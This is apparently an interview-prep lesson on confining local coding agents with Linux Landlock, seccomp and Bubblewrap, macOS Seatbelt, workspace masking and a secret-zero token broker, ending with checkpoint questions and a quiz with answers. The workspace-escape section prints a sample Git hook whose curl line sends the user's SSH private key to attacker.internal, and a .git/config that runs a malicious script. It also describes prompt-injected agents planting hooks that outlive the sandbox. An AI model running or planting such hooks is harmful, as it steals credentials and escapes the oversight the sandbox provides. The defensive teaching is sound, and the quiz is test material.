---
{
  "id": "local-agent-sandboxing-seatbelt-landlock",
  "title": "Local Agent Sandboxing: Seatbelt, Landlock & Workspace Boundaries",
  "slug": "local-agent-sandboxing-seatbelt-landlock",
  "category": "LLM Agents & Tool Use",
  "difficulty": "Hard",
  "companies": ["Anthropic", "OpenAI", "Google", "GitHub", "Apple"],
  "shortDescription": "Run a coding agent on your laptop without handing it your whole user account. Learn how OS sandboxes, workspace boundaries, and secret brokering limit what it can reach.",
  "prerequisites": [
    "code-generation-agents-sandboxing",
    "guardrails-safety-filters-production",
    "git-shell-linux-reproducible-ai"
  ],
  "keyConceptsTested": [
    "Unprivileged containment (Landlock LSM, macOS Seatbelt)",
    "Syscall filtering with Seccomp-BPF",
    "Workspace jailbreaks (.git hooks, shell dotfiles, IDE tasks)",
    "Unprivileged user namespaces and Bubblewrap",
    "Secret-Zero credential broking via Unix domain sockets",
    "Defense-in-depth local agent architectures"
  ],
  "relatedQuestions": [
    "code-generation-agents-sandboxing",
    "computer-use-gui-browser-agents",
    "ai-coding-workflow-with-agents",
    "human-in-the-loop-agent-architecture",
    "prompt-injection-defense-strategies"
  ],
  "section": "Advanced Agents & Retrieval",
  "order": 9
}
---

Suppose a coding agent on your laptop reads an issue, inspects local files, and runs tests to reproduce a bug. When it executes as an ordinary terminal process, it inherits your full user identity, allowing arbitrary reads of `~/.ssh/id_ed25519`, `~/.aws/credentials`, internal corporate subnets, and shell environment secrets. Unlike server jobs isolated with Docker, gVisor, or WebAssembly in [Code Generation & Sandboxing](/learn/code-generation-agents-sandboxing), a laptop runner must share the local working tree and compiler toolchain without requiring a rootful daemon.

Tools such as Claude Code, Codex CLI, and Gemini CLI still need direct file reads and local builds, yet a prompt injection inside a README or issue comment must not exfiltrate keys or rewrite persistent host files. A trusted supervisor keeps secrets outside the sandbox and grants the worker only what the task needs. On Linux, Landlock restricts declared filesystem and TCP rights, Seccomp-BPF filters raw system calls, and user/mount namespaces narrow process visibility; on macOS, Seatbelt profiles enforce per-process resource rules while repository masks protect host triggers.

<figure>
  <img src="illustrations/_generated/platform_authority_dark.png" alt="Comparison table of Linux Bubblewrap plus Landlock versus macOS Seatbelt permissions across five paths: Linux grants read-write to source code, read-only mounts to Git metadata and system directories, isolated tmpfs for scratch space, and excludes home credential directories; macOS grants whole-project writes unless explicit deny rules protect .git metadata while denying ~/.ssh and ~/.aws." />
  <figcaption>Compare writable subtrees across Linux and macOS profiles. Mount or lock down repository metadata explicitly on macOS so whole-project grants do not leave Git hooks writable.</figcaption>
</figure>


## Unprivileged containment with Linux Landlock

Linux Security Modules (LSMs) such as SELinux and AppArmor historically required root privileges to configure, whereas Linux 5.13 introduced **Landlock** as an unprivileged self-restriction subsystem.[^linuxLandlock2026] A thread can lock down itself and its future children without `sudo` prompts or daemons, while sibling threads require explicit thread synchronization flags. Because Landlock evaluates file permissions at open time, any descriptor opened beforehand retains its existing capabilities afterward; always close unneeded descriptors before untrusted execution and keep sensitive handles outside the worker.

A process configures Landlock through three kernel system calls:

1. `landlock_create_ruleset`: Defines the categories of actions to govern (filesystem access, TCP networking, and process scoping).
2. `landlock_add_rule`: Adds grants for file hierarchies or supported network ports. An `O_PATH` descriptor identifies a filesystem object; directory rules can cover its subtree.
3. `landlock_restrict_self`: Enforces the ruleset on the calling thread. Once enforced, the restriction cannot be revoked or broadened.

For the unprivileged manual setup used here, set `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` before enforcement. ABI 11 also offers a restriction flag that sets `no_new_privs` when enforcement succeeds. ABI 8 added `LANDLOCK_RESTRICT_SELF_TSYNC` for existing threads.[^linuxLandlock2026]

### Landlock rights used in this example

Landlock adds capabilities through a versioned ABI. Query the kernel at runtime with `landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION)`, then build a policy using only the features it supports:

- **ABI v1 (Linux 5.13):** Core filesystem rights, including file reads/writes, execution, directory enumeration, and object creation/removal.
- **ABI v2 (Linux 5.19):** File referral and rename rights (`LANDLOCK_ACCESS_FS_REFER`).
- **ABI v3 (Linux 6.2):** File truncation rights (`LANDLOCK_ACCESS_FS_TRUNCATE`).
- **ABI v4 (Linux 6.7):** TCP network access control (`LANDLOCK_ACCESS_NET_BIND_TCP` and `LANDLOCK_ACCESS_NET_CONNECT_TCP`).
- **ABI v5 (Linux 6.10):** Device ioctl controls (`LANDLOCK_ACCESS_FS_IOCTL_DEV`).
- **ABI v6 (Linux 6.12):** Process scoping controls (`LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET` and `LANDLOCK_SCOPE_SIGNAL`) for abstract sockets and signals across the Landlock domain boundary.

This subset stops at ABI 6. Probe the running kernel and handle unavailable rights explicitly. The following setup fragment assumes a successful probe and ABI 3 or newer. It creates a ruleset descriptor; adding grants, handling failures, and enforcing the policy still remain.

```c title="landlock_policy.c"
// Probe available ABI version
int abi = syscall(__NR_landlock_create_ruleset, NULL, 0, LANDLOCK_CREATE_RULESET_VERSION);

struct landlock_ruleset_attr attr = {
    .handled_access_fs = LANDLOCK_ACCESS_FS_READ_FILE |
                         LANDLOCK_ACCESS_FS_WRITE_FILE |
                         LANDLOCK_ACCESS_FS_EXECUTE |
                         LANDLOCK_ACCESS_FS_READ_DIR |
                         LANDLOCK_ACCESS_FS_TRUNCATE,
    .handled_access_net = (abi >= 4) ? (LANDLOCK_ACCESS_NET_CONNECT_TCP | LANDLOCK_ACCESS_NET_BIND_TCP) : 0,
    .scoped = (abi >= 6) ? (LANDLOCK_SCOPE_SIGNAL | LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET) : 0,
};

int ruleset_fd = syscall(__NR_landlock_create_ruleset, &attr, sizeof(attr), 0);
```

| Landlock Access Flag | Enforced Operation | Typical Local Agent Assignment |
| :--- | :--- | :--- |
| `LANDLOCK_ACCESS_FS_READ_FILE` | Open existing files for reading | Granted to system libraries, tools, and project workspace |
| `LANDLOCK_ACCESS_FS_READ_DIR` | Enumerate directory entries | Granted to system paths and project workspace |
| `LANDLOCK_ACCESS_FS_WRITE_FILE` | Write to existing files | Granted strictly to workspace `src/` and output directories |
| `LANDLOCK_ACCESS_FS_TRUNCATE` | Truncate a file | Governed separately from writes on ABI 3 or newer |
| `LANDLOCK_ACCESS_FS_MAKE_REG` | Create regular files | Granted strictly to workspace scratch locations |
| `LANDLOCK_ACCESS_FS_EXECUTE` | Execute binary programs or scripts | Granted to `/usr`, `/bin`, and virtualenv binaries |
| `LANDLOCK_ACCESS_FS_REFER` | Link or rename across directories | Restricted to prevent moving files outside sandbox paths |
| `LANDLOCK_ACCESS_NET_CONNECT_TCP` | Connect to outbound TCP ports | Denied inside worker; outbound requests routed to supervisor |
| `LANDLOCK_SCOPE_SIGNAL` | Send signals (kill/term) to processes | Restricted to sandbox-internal process tree |

Subtree scoping is useful on a developer machine: granting read-write access to `/home/dev/project` does not also grant access to `/home/dev/.ssh` or `/home/dev/.bashrc`, even though they share the `/home/dev` parent directory. That rule is Landlock on Linux. A Mac laptop needs a different kernel control for the same deny.

```checkpoint
Why is Landlock uniquely well-suited for local coding CLI agents compared to traditional SELinux or Docker?
---
Landlock operates unprivileged. A local CLI tool can restrict its own file-system access using standard system calls without requiring root privileges, sudo prompts, or a running Docker daemon.
```

## macOS Seatbelt and Sandbox Profiles

On macOS, a CLI runner can use a custom **Seatbelt** profile, as Chromium's implementation demonstrates.[^chromiumSeatbeltImplementation2026] Apple's supported App Sandbox model describes app resources through entitlements.[^appleSeatbelt2026] A custom CLI profile needs its own compatibility and enforcement checks on the target macOS release.

These C and Scheme fragments show a parameterized profile design. They are unexecuted integration fragments: a wrapper must supply `profile_string`, handle startup failures, and validate the resulting restrictions. All four path parameters used by the profile appear below:

```c title="seatbelt_init.c"
#include <sandbox.h>

// Initialize Seatbelt programmatically with path parameters
const char *params[] = {
    "PROJECT_DIR", "/Users/dev/workspace",
    "TARGET_HOME_SSH", "/Users/dev/.ssh",
    "TARGET_HOME_AWS", "/Users/dev/.aws",
    "TARGET_HOME_KEYCHAIN", "/Users/dev/Library/Keychains",
    NULL
};

char *error = NULL;
if (sandbox_init_with_parameters(profile_string, 0, params, &error) != 0) {
    fprintf(stderr, "Sandbox initialization failed: %s\n", error);
    sandbox_free_error(error);
    exit(1);
}
```

The profile starts with **default deny**, then grants selected operations. Its whole-project write grant also includes `.git`; protecting that metadata requires a narrower policy.

```scheme title="agent-sandbox.sb"
;; Declare version and default-deny policy
(version 1)
(deny default)

;; Permit process execution for approved binaries
(allow process-exec
    (literal "/bin/sh")
    (literal "/bin/bash")
    (literal "/usr/bin/git")
    (literal "/usr/bin/python3")
    (subpath "/usr/bin")
    (subpath "/usr/local/bin"))

;; Allow read-only access to standard system libraries and runtimes
(allow file-read*
    (subpath "/usr")
    (subpath "/lib")
    (subpath "/System")
    (subpath "/Library/Developer"))

;; Explicitly deny sensitive developer directories
(deny file-read* file-write*
    (subpath (param "TARGET_HOME_SSH"))
    (subpath (param "TARGET_HOME_AWS"))
    (subpath (param "TARGET_HOME_KEYCHAIN")))

;; Permit read and write only within the designated project root
(allow file-read* file-write*
    (subpath (param "PROJECT_DIR")))

;; Permit standard process IPC and terminal descriptors
(allow file-read* file-write*
    (literal "/dev/null")
    (literal "/dev/zero")
    (literal "/dev/urandom")
    (literal "/dev/tty"))

;; Deny arbitrary network access
(deny network*)
```

Passing named parameters lets the supervisor bind workspace and home directories dynamically at startup rather than hardcoding paths into the Scheme policy. Keep in mind that filesystem rules and Mach IPC service-lookup rules govern independent resources, so adding `(deny mach-lookup ...)` requires testing required system services on the target macOS version. Although the profile blocks credential subpaths and network sockets, granting write access to `PROJECT_DIR` still leaves repository internals exposed to host-side execution triggers.

## The workspace escape: securing repository internals

Granting writes across an entire project directory permits edits to configuration files that run later outside the sandbox under your host account. Even when `~/.ssh` and outbound networking are completely blocked, an untrusted coding agent with broad workspace writes can gain persistent host execution through repository metadata and editor settings:

### 1. The `.git/hooks/` execution trap
Git repositories store client-side lifecycle hooks such as `post-checkout`, `pre-commit`, and `post-merge` inside `.git/hooks/`.[^gitHookSecurity2026] Suppose an untrusted agent plants an executable script at `.git/hooks/post-checkout` like the shell payload below:

```bash title="malicious_post_checkout.sh"
#!/bin/sh
curl -s http://attacker.internal/exfil?d=$(cat ~/.ssh/id_ed25519 | base64)
```

With the default hooks directory and executable bit set, a later host `git checkout main` can invoke that hook after updating the worktree.[^gitHookSecurity2026] It runs under the account that invoked Git. A normal tracked-file diff may never show the planted repository metadata.

<figure>
  <img src="illustrations/_generated/workspace_host_trigger_dark.png" alt="Workspace persistence attack diagram showing three steps: an unmasked repository lets a worker plant .git/hooks/post-checkout, the executable file survives worker exit, and a later host git checkout runs that hook under the user's host account, contrasted with read-only masking of .git that blocks the write and leaves trusted hooks untouched." />
  <figcaption>A planted hook outlives the worker process and triggers when host Git commands run later. Mounting <code>.git</code> and IDE dotfiles read-only blocks metadata tampering, while pre-run hook inspection verifies existing scripts.</figcaption>
</figure>

### 2. The `.git/config` command execution trap
The repository configuration file `.git/config` supports command directives:

```ini title=".git/config"
[core]
    fsmonitor = /path/to/malicious/script.sh
[diff "custom"]
    command = /path/to/malicious/script.sh
```

An operation that uses the configured filesystem monitor or enabled external diff can execute the selected command under the host account. The trigger depends on the operation and configuration.

### 3. IDE and build task configurations
Editors and developer tools consume repository configuration under their own trust settings:
- `.vscode/tasks.json` can request a `"runOn": "folderOpen"` task. Workspace trust and automatic-task approval affect whether it runs.
- `.idea/` and `.devcontainer/` configurations can request container or script launches when the corresponding feature is used.
- `.pre-commit-config.yaml` is consumed by configured pre-commit hooks; an approved `.envrc` can run when direnv loads the directory.

### The defense: workspace masking
A secure local sandbox must enforce **workspace masking**:

1. **Isolate or mount `.git` read-only:** The supervisor separates the working tree from repository metadata. Landlock grants are additive within a layer: a broad writable parent grant also covers its descendants. Grant writes to selected source subtrees, or use an independently restrictive layer or mount arrangement. An environment variable alone doesn't revoke filesystem access.
2. **Deny hidden configuration files:** Restrict writes targeting dotfiles (`.*`), specifically `.git*`, `.vscode*`, `.env*`, and `.pre-commit*`.
3. **Audit diffs before host interaction:** Verify that candidate changes affect only intended source directories (e.g., `src/`, `tests/`) before letting host tools touch the repository.

```checkpoint
Why is a Landlock rule granting read-write access to a git repository root directory insufficient to protect the host?
---
Writable Git metadata can plant an executable hook or configure a command. A later matching host Git operation can run it under the developer's account, after the worker has exited.
```

## Syscall filtering with Seccomp-BPF

Filesystem restrictions keep local credentials off limits, yet a confined worker can still probe sibling processes or invoke unsafe kernel interfaces directly. Linux **Seccomp-BPF** (Secure Computing with Berkeley Packet Filter) closes that path by attaching a filter program that inspects every system call number and raw argument register before kernel dispatch.[^linuxSeccompBpf2026] Pair syscall rules with mount namespaces so neither file paths nor raw OS interfaces expose unintended privileges.

Choose a syscall policy for the worker's runtime and threat model. Common restrictions include:
- `ptrace`: Prevents inspecting, pausing, or modifying memory of sibling or parent processes.
- `bpf`: Blocks loading kernel BPF bytecode or probing kernel tracing points.
- `chroot`: Blocks attempts to change the process root directory through this call.
- `keyctl`: Prevents querying kernel session keyrings.
- `socket(AF_PACKET, ...)` and `socket(AF_NETLINK, ...)`: Prevents sniffing raw network packets or altering routing tables.

**Bubblewrap** (`bwrap`) constructs a restricted namespace and mount view, while Seccomp provides a complementary syscall filter.[^bubblewrap2026][^linuxSeccompBpf2026] The command below mounts source separately from metadata. It does not load a seccomp program; that needs an explicit filter descriptor and `--seccomp` or the corresponding supported option.

```bash title="bubblewrap-sandbox.sh"
bwrap \
  --ro-bind /usr /usr \
  --ro-bind /lib /lib \
  --ro-bind /bin /bin \
  --tmpfs /tmp \
  --proc /proc \
  --dev /dev \
  --bind /path/to/repo/src /app/src \
  --ro-bind /path/to/repo/.git /app/.git \
  --unshare-all \
  --new-session \
  --die-with-parent \
  python3 -m unittest discover /app/src
```

Key flags in this configuration:
- `--ro-bind /path/to/repo/.git /app/.git`: This mount rejects metadata writes. Review other writable inputs that host tools may consume.
- `--unshare-all`: Isolates mount, PID, IPC, and network namespaces.
- `--die-with-parent`: Kills the sandboxed command when bwrap's parent dies. Verify teardown and resource cleanup separately.

## Secret-zero containment via Unix domain sockets

Agents frequently need external services such as reading CI status or fetching pull-request metadata, yet placing `GITHUB_TOKEN` in worker environment variables lets any script read `os.environ["GITHUB_TOKEN"]` and leak it to logs. In a **secret-zero** architecture, zero credentials enter the sandbox; instead, the host broker fixes the upstream origin, accepts only allowlisted routes such as `GET /repos/owner/repo/pulls/42`, and rejects disallowed methods (`POST`, `DELETE`) or other repositories locally with `403` before network egress. Once an approved upstream reply arrives, the broker extracts only allowlisted fields such as `number` and `state`, discarding extra keys like `debug_token` before forwarding data over the Unix socket.

<figure>
  <img src="illustrations/_generated/credential_broker_dark.png" alt="Secret-zero credential broker flow across a Unix domain socket: a tokenless worker sends requests to the host broker, which allows GET on owner/repo/pulls/42, adds Bearer credentials only outbound to upstream, rejects POST or wrong repositories locally with 403, and strips unexpected reply fields such as debug_token before returning data." />
  <figcaption>The worker talks only to a local Unix socket with zero mounted API tokens. After validating method and repository scope, the host attaches credentials outbound and filters unexpected reply fields before data returns.</figcaption>
</figure>


The sandboxed process connects to a local Unix domain socket mounted into its environment. The supervisor validates:
1. Is the HTTP method allowed (`GET` permitted; `DELETE` or `POST` rejected)?
2. Does the requested URL match the approved repository scope?
3. Are returned response fields sanitized to avoid reflecting secrets?

Keeping authentication tokens inside the host broker closes direct environment and filesystem secret leaks. Even with outbound tokens shielded, an authorized API call or verbose upstream response can expose unrelated repository objects or sensitive fields. Strictly scoping reachable repositories, fixing upstream origins, and allowlisting parsed JSON fields ensures the worker sees only the minimum metadata needed to finish its task.

## Executable path-policy simulation

The Python script below evaluates five target paths against a workspace policy using path canonicalization (`Path.resolve`) and protected-ancestor checks before opening files in a real sandbox. Resolve-and-compare helpers clarify intended rules, while production opens still require kernel controls such as Landlock or `O_NOFOLLOW` to close time-of-check to time-of-use gaps.

<!-- leetllm: test, output=show -->
```python title="local_landlock_sandbox.py"
import os
import sys
import ctypes
import tempfile
from pathlib import Path

# Landlock ABI constants (Linux 5.13+)
LANDLOCK_CREATE_RULESET_VERSION = (1 << 0)
LANDLOCK_RULE_PATH_BENEATH = 1

# Filesystem access rights
ACCESS_FS_READ = (
    (1 << 0) |  # EXECUTE
    (1 << 1) |  # WRITE_FILE
    (1 << 2) |  # READ_FILE
    (1 << 3) |  # READ_DIR
    (1 << 5)    # REMOVE_FILE
)
ACCESS_FS_WRITE = (1 << 1) | (1 << 5)

class PathValidator:
    """Evaluates workspace boundaries and denies dangerous repository hooks."""
    def __init__(self, workspace_root: Path):
        self.workspace_root = workspace_root.resolve()
        self.denied_subpaths = {
            self.workspace_root / ".git" / "hooks",
            self.workspace_root / ".git" / "config",
            self.workspace_root / ".vscode",
            self.workspace_root / ".env",
        }

    def can_write(self, target_path: Path) -> bool:
        resolved = target_path.resolve()
        # Must be within workspace
        try:
            resolved.relative_to(self.workspace_root)
        except ValueError:
            return False  # Path traversal attempt outside workspace

        # Must not be inside any protected configuration target
        for denied in self.denied_subpaths:
            if resolved == denied or denied in resolved.parents:
                return False
        return True

# Build a temporary test workspace
with tempfile.TemporaryDirectory() as temp_dir:
    root = Path(temp_dir)
    src_dir = root / "src"
    git_hooks_dir = root / ".git" / "hooks"
    vscode_dir = root / ".vscode"
    
    src_dir.mkdir(parents=True)
    git_hooks_dir.mkdir(parents=True)
    vscode_dir.mkdir(parents=True)

    validator = PathValidator(root)

    # 1. Standard source file edit -> Allowed
    valid_source = src_dir / "app.py"
    assert validator.can_write(valid_source) is True

    # 2. Path traversal attack -> Denied
    traversal_attack = root / ".." / ".ssh" / "authorized_keys"
    assert validator.can_write(traversal_attack) is False

    # 3. .git/hooks execution trap -> Denied
    hook_attack = git_hooks_dir / "post-checkout"
    assert validator.can_write(hook_attack) is False

    # 4. .git/config execution trap -> Denied
    config_attack = root / ".git" / "config"
    assert validator.can_write(config_attack) is False

    # 5. IDE task execution trap -> Denied
    ide_task_attack = vscode_dir / "tasks.json"
    assert validator.can_write(ide_task_attack) is False

    print("Policy checks passed:")
    print(" - Allowed write to src/app.py:", validator.can_write(valid_source))
    print(" - Blocked traversal to .ssh:", not validator.can_write(traversal_attack))
    print(" - Blocked write to .git/hooks/post-checkout:", not validator.can_write(hook_attack))
    print(" - Blocked write to .vscode/tasks.json:", not validator.can_write(ide_task_attack))
```

<!-- leetllm: output:start -->
```text title="Output" output compact
Policy checks passed:
 - Allowed write to src/app.py: True
 - Blocked traversal to .ssh: True
 - Blocked write to .git/hooks/post-checkout: True
 - Blocked write to .vscode/tasks.json: True
```
<!-- leetllm: output:end -->

The assertions confirm five path decisions, including `.git/config`. Four appear in stdout. No file write, malicious hook, Landlock policy, or macOS profile is exercised by these checks.

The policy rules cover four exact targets: descendants of `.git/hooks` and `.vscode`, plus `.git/config` and `.env`. Notice that the `.git` directory itself passes this helper, and `.env.local` falls outside that exact denied set, so production file opening still requires kernel enforcement to cover symlink races and wildcard dotfiles.

<figure>
  <img src="illustrations/_generated/path_policy_tree_dark.png" alt="Resolved-path policy diagram showing sibling traversal ../.ssh/authorized_keys blocked outside the workspace root while protected paths under the root (.git/hooks, .git/config, .vscode/tasks.json) are rejected, src/app.py is permitted, and .env is configured as a protected target." />
  <figcaption><code>PathValidator</code> resolves each candidate relative to the workspace root and walks protected ancestors. Paths escaping root or matching denied targets fail, while kernel controls remain necessary against TOCTOU races.</figcaption>
</figure>

### Follow-up questions

#### How can an agent install third-party dependencies (e.g., pip packages) if network access is disabled inside the worker?

The supervisor handles dependency resolution outside the untrusted worker or proxies downloads through a local caching server. The supervisor prefetches wheels, validates their cryptographic hashes against lockfiles, and mounts the package directory read-only into the worker environment. This prevents the worker from downloading arbitrary unverified remote code during execution.

#### What happens if the local developer machine runs an older Linux kernel (e.g. 5.10) where Landlock is unavailable?

Probe Landlock support at startup and inspect failures: `ENOSYS` can indicate an unavailable syscall; disabled support can return `EOPNOTSUPP`. Choose an alternative only if its configured controls meet the task's required filesystem, process, and network policy. Seccomp alone filters syscalls without providing complete containment. Fail closed when a required protection is unavailable.

### What strong answers show

- Clear distinction between unprivileged OS sandboxing (Landlock, Seatbelt, Bubblewrap) and rootful container systems (Docker).
- Awareness of workspace jailbreak vectors beyond path traversal, specifically `.git/hooks`, `.git/config`, shell dotfiles, and IDE auto-execution configs.
- Knowledge of the modern Landlock ABI evolution, including network socket restrictions (ABI v4) and signal scoping (ABI v6).
- Implementation of secret-zero token brokering via host Unix domain sockets with granular request authorization.

## Check your understanding

Apply these local-sandboxing principles to two concrete scenarios covering helper path matching and layer independence before taking the mastery quiz. Each scenario separates what a single check demonstrates from the additional controls needed in production.

```checkpoint
A minimal path-guard helper rejects descendants of .git/hooks and .vscode and the exact targets .git/config and .env. It otherwise allows resolved paths inside its workspace. How does it classify .env.test and .git/config.bak?

- Both pass this helper; broader environment/metadata protection needs a broader rule set.
- Both fail this helper; an exact target implicitly protects every filename with that prefix.
- .env.test fails and .git/config.bak passes; dot-env is treated as a filename prefix.
- .env.test passes and .git/config.bak fails; config is treated as a filename prefix.
---
Both pass this helper; broader environment/metadata protection needs a broader rule set.

These are different filenames, not descendants of the exact file targets. The helper’s set is narrower than a policy excluding all environment files or metadata. Its result neither installs a kernel sandbox nor proves that broader policy.
```

```checkpoint
A Bubblewrap command mounts Git metadata read-only, and a test metadata write fails. No seccomp filter descriptor was loaded. What evidence claim is justified?

- The write failed under the read-only mount; the same run establishes a ptrace syscall deny.
- The write failed through the syscall filter; the read-only mount requires no separate check.
- The write failed through namespace naming; this establishes every resource operation is contained.
- The write failed under the mounted view; syscall filtering needs its own configured policy and probes.
---
The write failed under the mounted view; syscall filtering needs its own configured policy and probes.

The invocation did not load a seccomp program. A denied metadata write tests that operation under the mount view, not an unrelated syscall or the whole sandbox. Configure the required filter and test its actual paths separately.
```

```mastery-quiz
[
  {
    "question": "Two Linux runners must each protect a six-byte reference file. Landlock covers ordinary writes on both but lacks the truncation right. The runners use different fallback policies. Ash’s policy denies a direct request to set its file’s length to two bytes. Elm’s policy denies an attempt to replace two bytes in place. Both files still contain the original six bytes. All other launch checks pass. Which runners can start?",
    "options": [
      "Start Ash and start Elm.",
      "Hold Ash and hold Elm.",
      "Start Ash and hold Elm.",
      "Hold Ash and start Elm."
    ],
    "answer": "Start Ash and hold Elm.",
    "explanation": "Ash asked to remove four bytes. The policy denied that operation, and the readback confirms the file stayed intact. This verifies Ash’s fallback for the required truncation. Elm asked to overwrite two bytes at the existing length. Its denial tests ordinary writes again. Elm still needs evidence that its fallback prevents shortening."
  },
  {
    "question": "Before applying a filesystem policy, a supervisor opens a secret file and accidentally passes that descriptor to the worker. The policy denies a fresh open of the secret path. Which assessment follows?",
    "options": [
      "The fresh-open denial does not revoke the earlier descriptor; remove sensitive inherited handles.",
      "The fresh-open denial revokes the earlier descriptor; retaining that inherited handle is sufficient.",
      "A directory change revokes the earlier descriptor; start the worker in a different working directory.",
      "The earlier descriptor retains access; hide its pathname to stop the worker from using that handle."
    ],
    "answer": "The fresh-open denial does not revoke the earlier descriptor; remove sensitive inherited handles.",
    "explanation": "Permissions associated with an opened file can survive later enforcement. Removing a name from the worker’s view or denying a fresh open does not revoke an already opened handle. Prevent descriptor inheritance and verify the active sandbox."
  },
  {
    "question": "One Landlock layer grants writes beneath /repo. A second rule in that same layer grants only reads beneath /repo/.git. What happens to the parent-derived metadata write grant?",
    "options": [
      "Parent write disappears; the more specific child read grant replaces the parent’s write grant.",
      "Parent write remains; use narrower writable grants or an independently restrictive layer.",
      "Parent write disappears; the second matching rule turns the layer into a subtractive deny.",
      "Parent write remains; adding a third same-layer read grant removes the inherited write grant."
    ],
    "answer": "Parent write remains; use narrower writable grants or an independently restrictive layer.",
    "explanation": "Matching grants union within one layer, so the broad writable parent still grants the metadata write. Narrow the writable grant or compose a genuinely restrictive layer or read-only mount; repeating child grants cannot subtract the parent grant."
  },
  {
    "question": "A policy permits writes only below /project/src. The directory link /project/src/cache points to /vault/keys. Resolve /project/src/cache/../report under the illustrated component-wise model. Which result is correct?",
    "options": [
      "/project/src/report; allow under the source subtree.",
      "/vault/keys/report; deny outside the source subtree.",
      "/project/report; deny outside the source subtree.",
      "/vault/report; deny outside the source subtree."
    ],
    "answer": "/vault/report; deny outside the source subtree.",
    "explanation": "Follow the link first to /vault/keys, then apply .. to reach /vault, then report. Lexically removing cache/.. before following the link would authorize the wrong resource. This computes intended policy, not race-resistant host enforcement."
  },
  {
    "question": "A worker writes an editor folder-open task and exits. Later the host opens the workspace and approves that task under its trust policy. Which lifecycle description is correct?",
    "options": [
      "The task inherits the ended worker’s restrictions because the worker authored the saved file.",
      "The task is canceled when the worker exits because its execution lifetime follows the author.",
      "The saved configuration triggers a new host-side execution under the approving tool’s privileges.",
      "The configuration becomes harmless after exit because a normal tracked diff omits that file."
    ],
    "answer": "The saved configuration triggers a new host-side execution under the approving tool’s privileges.",
    "explanation": "The file can outlive its authoring process. A later approved host action starts a fresh execution context, so the ended worker's sandbox no longer follows the saved file. Protect configuration files before launch and audit workspace hooks before host interaction."
  },
  {
    "question": "A loaded seccomp filter permits openat. Filesystem policy denies the requested private-key resource. In the order syscall decision, resource decision, final operation, which result follows?",
    "options": [
      "Deny; allow; deny.",
      "Allow; deny; deny.",
      "Allow; deny; allow.",
      "Allow; allow; allow."
    ],
    "answer": "Allow; deny; deny.",
    "explanation": "Passing one gate does not bypass the other. Seccomp inspects syscall numbers and argument values but does not generally dereference a pathname pointer for resource authorization; the filesystem restriction still denies this operation."
  },
  {
    "question": "A broker policy permits only GET for /repos/team/widget/pulls/7 at a host-fixed origin and returns only number and state. A worker changes that request to POST. Which result follows?",
    "options": [
      "Deny before dispatch and keep the host credential outside the worker.",
      "Dispatch POST with the host credential, then hide its reply from the worker.",
      "Rewrite POST to GET and dispatch without recording the changed request.",
      "Send the credential to the worker so it can retry the rejected request itself."
    ],
    "answer": "Deny before dispatch and keep the host credential outside the worker.",
    "explanation": "The changed method violates the allowlisted request rule, so it stops before an upstream effect. The broker retains the credential. Reply filtering alone cannot undo an unauthorized dispatch, and silent rewriting changes the request’s meaning."
  },
  {
    "question": "A Mac worker needs to edit src in a disposable repository. A trusted hook in .git prints READY when the host commits. To replace a project-wide Seatbelt write grant, a maintainer tries a source edit and a change to the hook’s message under each candidate profile, then stops the worker. Which write grant and host check would protect the hook and verify it across the handoff?",
    "options": [
      "Grant writes under src. Check that the host’s tracked diff shows just the source edit.",
      "Grant writes under src and .git. Check that a host commit still prints READY.",
      "Grant writes under src. Check that a host commit still prints READY.",
      "Grant writes under src and .git. Check that the host’s tracked diff shows just the source edit."
    ],
    "answer": "Grant writes under src. Check that a host commit still prints READY.",
    "explanation": "With writes limited to src, the source edit should succeed and the hook change should fail. The host commit then runs the trusted hook and prints READY. Granting writes under .git lets the worker change the message that survives its exit. A tracked diff omits the hook and never tests which message the host commit prints."
  },
  {
    "question": "A supervisor has two existing threads. Only thread A applies a self-restriction without a supported thread-synchronization flag, then launches a new child. Which coverage claim is warranted?",
    "options": [
      "Existing A and B and the future child gain the restriction because they share a process name.",
      "A and its future child inherit the restriction; existing B needs a separately supported coverage path.",
      "The future child gains the restriction; calling thread A retains its original unrestricted rights.",
      "Existing B gains the restriction; the future child runs unrestricted because it starts afterward."
    ],
    "answer": "A and its future child inherit the restriction; existing B needs a separately supported coverage path.",
    "explanation": "Self-restriction covers the calling thread and future children. Existing sibling threads need supported synchronization or another verified setup. A shared process name does not broaden enforcement coverage."
  },
  {
    "question": "A supervisor verifies a wheel’s hash against an approved lockfile and mounts the package store read-only. The wheel’s code will run during tests. Which interpretation is correct?",
    "options": [
      "The digest certifies harmless behavior; give package execution the host’s unrestricted credentials.",
      "The read-only store blocks connections from imported code, so the tests need no network restriction.",
      "The digest confines package writes to its store; allow other workspace and home writes during execution.",
      "The digest binds approved bytes; retain filesystem, credential and network restrictions during execution."
    ],
    "answer": "The digest binds approved bytes; retain filesystem, credential and network restrictions during execution.",
    "explanation": "The digest identifies the wheel in the approved lockfile. Its code still runs with the test process’s permissions. Giving that process host credentials would expose them to the code. The read-only mount protects files in the store. Writes elsewhere depend on filesystem permissions, and outbound connections depend on network policy. Keep those restrictions in place for the tests and their children."
  }
]
```

> **Next:** Continue to [Computer-Use / GUI / Browser Agents](/learn/computer-use-gui-browser-agents). Keep a laptop agent off your SSH keys, your git hooks, and your tokens. A shell sandbox doesn't answer the same split when the agent acts through desktop pixels and a browser.
